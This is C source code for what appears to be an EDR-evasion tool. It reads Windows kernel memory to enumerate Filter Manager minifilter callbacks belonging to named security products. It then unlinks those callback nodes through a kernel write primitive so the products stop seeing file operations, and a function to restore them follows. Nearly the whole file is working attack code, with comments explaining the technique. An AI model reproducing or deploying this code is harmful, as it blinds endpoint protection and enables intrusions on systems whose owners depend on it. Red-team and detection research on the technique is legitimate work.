#include <Windows.h>
#include <Tchar.h>

#ifdef _DEBUG
#include <assert.h>
#endif

#include "FltmgrOffsets.h"
#include "IsEDRChecks.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "PrintFunctions.h"
#include "PdbSymbols.h"
#include "MinifilterCallbacks.h"


/*
This function browses the internal structures of the Filter Manager to enumerate callbacks registered
by EDR products. 

To provide a quick context about the different internal structures:
	- The Filter Manager establishes a "frame" (_FLTP_FRAME) as its root structure;
	- A "volume" structure (_FLT_VOLUME) is instanciated for each "disk" managed by the Filter Manager (can be partitions,
		shadow copies, or special ones corresponding to named pipes or remote file systems);
	- To each registered minifilter driver corresponds a "filter" structure (_FLT_FILTER), describing various properties such
		as its supported operations;
	- These minifilters are not all attached to each volume; an "instance" (_FLT_INSTANCE) structure is created to mark each of the 
		filter<->volume association;
	- Minifilters register callback functions that are executed before and/or after specific operation (file open, write, read, etc.).
		These callbacks are described in _CALLBACK_NODE structures. An array of all _CALLBACK_NODE implemented by an instance of a 
		minifilter can be found in _FLT_INSTANCE; the array indexed by the IRP "major function" code, a constant representing the operation
		affected by the callback (IRP_MJ_CREATE, IRP_MJ_READ, etc.).
		Moreover, all _CALLBACK_NODEs implemented by instances linked to a specific volume are regrouped in linked lists, stored in the
		_FLT_VOLUME.Callbacks.OperationLists array indexed by IRP major function codes.

Upon a specific operation (for example, a file opening on C:), the appropriate _FLT_VOLUME is recovered from the _FLTP_FRAME structure
(AttachedVolumes's list), the _FLT_VOLUME.Callbacks.OperationLists[irpMajorFunctionCode] list of _CALLBACK_NODE is browsed and callbacks
functions are executed.

In order to detect EDR-related callbacks, the following function:
	- Enumerates the frames (_FLTP_FRAME) thanks to a list stored in a global variable of fltmgr.sys: ((_GLOBALS*)&FltGlobals)->FrameList.rList
	- Enumerates the filters (_FLT_FILTER) of the frame: ((_FLTP_FRAME*)currentFrame)->RegisteredFilters.rList
	- Checks if the driver implementing the filter is EDR-related (checks the name of the module where 
		(_FLT_FILTER*)currentFilter->DriverObject->DriverInit is implemented)
	- If the driver is an EDR, enumerate all instances of the associated filter, by browsing ((_FLT_FILTER*)currentFilter)->InstanceList.rList
	- For each instance, enumerate the CallbackNodes array, whose non-NULL entries directly point to _CALLBACK_NODEs in their respective 
		lists in _FLT_VOLUME.Callbacks.OperationLists
*/
BOOL EnumEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* foundEDRCallbacks, BOOL verbose) {
	BOOL edrCallbacksWereFound = FALSE;

	DWORD64 fltmgr_base = FindKernelModuleAddressByName(L"fltmgr.sys");
	if (!fltmgr_base)
		return -1;
	if (verbose) {
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\tfltmgr.sys : %016llx\n"), fltmgr_base);
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\tFltGlobals : %016llx\n"), fltmgr_base
			+ g_fltmgrOffsets.st.FltGlobals);
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\tFrameList  : %016llx\n"), fltmgr_base
			+ g_fltmgrOffsets.st.FltGlobals
			+ g_fltmgrOffsets.st._GLOBALS_FrameList
			+ g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList);
	}

	_putts_or_not(TEXT("[*] [MinifilterCallbacks]\tEnumerating minifilters' frames, filters, instances and callback nodes:"));
	DWORD64 frame_list_header = fltmgr_base 
		+ g_fltmgrOffsets.st.FltGlobals 
		+ g_fltmgrOffsets.st._GLOBALS_FrameList
		+ g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
	for (DWORD64 current_frame_shifted = ReadMemoryDWORD64(frame_list_header);
		current_frame_shifted != frame_list_header;
		current_frame_shifted = ReadMemoryDWORD64(current_frame_shifted)
		) {
		DWORD64 current_frame = current_frame_shifted - g_fltmgrOffsets.st._FLTP_FRAME_Links;
		_tprintf_or_not(TEXT("[*] [MinifilterCallbacks]\t_FLTP_FRAME : %016llx:\n"), current_frame);

		DWORD64 filter_list_header = current_frame + g_fltmgrOffsets.st._FLTP_FRAME_RegisteredFilters + g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
		for (DWORD64 current_filter_shifted = ReadMemoryDWORD64(filter_list_header);
			current_filter_shifted != filter_list_header;
			current_filter_shifted = ReadMemoryDWORD64(current_filter_shifted)
			) {
			DWORD64 current_filter = current_filter_shifted - g_fltmgrOffsets.st._FLT_OBJECT_PrimaryLink;


			// check if current filter is EDR-related
			DWORD64 driverObject = ReadMemoryDWORD64(current_filter + g_fltmgrOffsets.st._FLT_FILTER_DriverObject);
			DWORD64 driverInit = ReadMemoryDWORD64(driverObject + g_fltmgrOffsets.st._DRIVER_OBJECT_DriverInit);
			DWORD64 driverOffset;
			TCHAR* driver = FindDriverName(driverInit, &driverOffset);
			_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t_FLT_FILTER %016llx (%s)\n"), current_filter, driver);

			if (driver && isDriverNameMatchingEDR(driver)) {
				_putts_or_not(TEXT("[+] [MinifilterCallbacks]\t\t\tEDR-related filter found! Enumerating callbacks from all instances:"));

				DWORD64 instance_list_header = current_filter + g_fltmgrOffsets.st._FLT_FILTER_InstanceList + g_fltmgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList;
				for (DWORD64 current_instance_shifted = ReadMemoryDWORD64(instance_list_header);
					current_instance_shifted != instance_list_header;
					current_instance_shifted = ReadMemoryDWORD64(current_instance_shifted)
					) {
					DWORD64 current_instance = current_instance_shifted - g_fltmgrOffsets.st._FLT_INSTANCE_FilterLink;
					_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t\t_FLT_INSTANCE %016llx: "), current_instance);

					// for each CALLBACK_NODE in the array
					DWORD64 CallbackNodesArray = current_instance + g_fltmgrOffsets.st._FLT_INSTANCE_CallbackNodes;
					SIZE_T nbCallbackNodes = 0;
					for (int j = 0; j < 50; j++)
					{
						DWORD64 CallbackNodePointer = ReadMemoryDWORD64(CallbackNodesArray + (j * sizeof(PVOID)));
						// Register all callback nodes
						if (CallbackNodePointer)
						{
							// Ugly hack: check if the node really is part of a linked list or have already been unlinked
							// TODO: change the whole logic of this file and browse callback nodes directly from _FLT_VOLUME.Callbacks.OperationLists ?
							DWORD64 prevNode = ReadMemoryDWORD64(CallbackNodePointer + offsetof(LIST_ENTRY, Blink));
							DWORD64 prevNodeNext = ReadMemoryDWORD64(prevNode + offsetof(LIST_ENTRY, Flink));
							DWORD64 nextNode = ReadMemoryDWORD64(CallbackNodePointer + offsetof(LIST_ENTRY, Flink));
							DWORD64 nextNodePrev = ReadMemoryDWORD64(nextNode + offsetof(LIST_ENTRY, Blink));
							if (prevNodeNext != CallbackNodePointer && nextNodePrev != CallbackNodePointer) {
								continue;
							}

							struct KRNL_CALLBACK cb = {
								.type = MINIFILTER_CALLBACK,
								.addresses.minifilter_callback.callback_node = CallbackNodePointer,
								.callback_func = 0, //TODO: complete with preoperation & postoperations func address for information
								.driver_name = driver,
								.removed = FALSE,
							};
							AddFoundKernelCallback(foundEDRCallbacks, &cb);
							edrCallbacksWereFound = TRUE;
							nbCallbackNodes++;
						}
					}
					_tprintf_or_not(TEXT("%llu callback nodes found!\n"), nbCallbackNodes);
				}
			}
		}
	}

	return edrCallbacksWereFound;
}

#if WriteMemoryPrimitiveIsAtomic
/*
When EDR-related _CALLBACK_NODEs have been identified thanks to the previous function, to disable the callbacks, these nodes are
simply unlinked from their lists.
That way, the filter manager will not see the callback nodes and never execute the associated pre/post-operations functions upon
some specific I/O operation.

Note: since we are modifying linked lists without holding any lock and while the operating system could browse the lists at the
same time, we have to maintain at least some consistency during modification. The write primitive should be able to write a whole
pointer (i.e. 8 bytes) in a single call, or else the overwritten pointer would have an incorrect value between 2 calls, and could
lead to a crash if the operating system browses the list.
*/
void RemoveEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
	_putts_or_not(TEXT("[+] [MinifilterCallbacks]\tRemoving previously identified callbacks nodes by unlinking them from their list"));
	SIZE_T counter = 0;
	for (struct KRNL_CALLBACK* ptr = edrCallbacks->EDR_CALLBACKS;
		ptr < edrCallbacks->EDR_CALLBACKS + edrCallbacks->size;
		ptr++
		) {
		if (ptr->type == MINIFILTER_CALLBACK &&
			ptr->removed == FALSE) {
			DWORD64 callbackNodeAddress = ptr->addresses.minifilter_callback.callback_node;
			DWORD64 prevNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Blink));
			DWORD64 nextNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Flink));
			WriteMemoryDWORD64(nextNodeAddress + offsetof(LIST_ENTRY, Blink), prevNodeAddress);
			WriteMemoryDWORD64(prevNodeAddress + offsetof(LIST_ENTRY, Flink), nextNodeAddress);
			ptr->removed = TRUE;
			counter++;
		}
	}
	_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t%llu callback nodes were removed!\n"), counter);
}


/*
To restore the callbacks, we rely on the fact that the LIST_ENTRY of the _CALLBACK_NODE still points to the original previous 
and next nodes in the list where is was unlinked from. We simply reinsert the nodes in the inverse order from which unlinked 
them to ensure the linked list consistency during the process.
*/
BOOL RestoreEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
	BOOL success = TRUE;
	_putts_or_not(TEXT("[+] [MinifilterCallbacks]\tRestoring unlinked callbacks node by re-inserting them in their original place"));
	SIZE_T counter = 0;
	// reinsert the nodes in the inverse order to avoid invalid states
	for (struct KRNL_CALLBACK* ptr = edrCallbacks->EDR_CALLBACKS + edrCallbacks->size - 1;
		edrCallbacks->EDR_CALLBACKS <= ptr;
		ptr--
		) {
		if (ptr->type == MINIFILTER_CALLBACK &&
			ptr->removed == TRUE) {
			DWORD64 callbackNodeAddress = ptr->addresses.minifilter_callback.callback_node;
			DWORD64 prevNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Blink));
			DWORD64 nextNodeAddress = ReadMemoryDWORD64(callbackNodeAddress + offsetof(LIST_ENTRY, Flink));

			// Checks that "previous" and "next" nodes are still next to each other in the list
			DWORD64 prevNodeFlink = ReadMemoryDWORD64(prevNodeAddress + offsetof(LIST_ENTRY, Flink));
			DWORD64 nextNodeBlink = ReadMemoryDWORD64(nextNodeAddress + offsetof(LIST_ENTRY, Blink));
			if (prevNodeFlink != nextNodeAddress || nextNodeBlink != prevNodeAddress) {
				_putts_or_not(TEXT("[-] [MinifilterCallbacks]\tWARNING: a callback node could not have been restored! Maybe the node list changed between node removal and node reinsertion?"));
				success = FALSE;
				continue;
			}

			WriteMemoryDWORD64(nextNodeAddress + offsetof(LIST_ENTRY, Blink), callbackNodeAddress);
			WriteMemoryDWORD64(prevNodeAddress + offsetof(LIST_ENTRY, Flink), callbackNodeAddress);
			ptr->removed = FALSE;
			counter++;
		}
	}
	_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t%llu callback nodes were restored!\n"), counter);
	return success;
}
#endif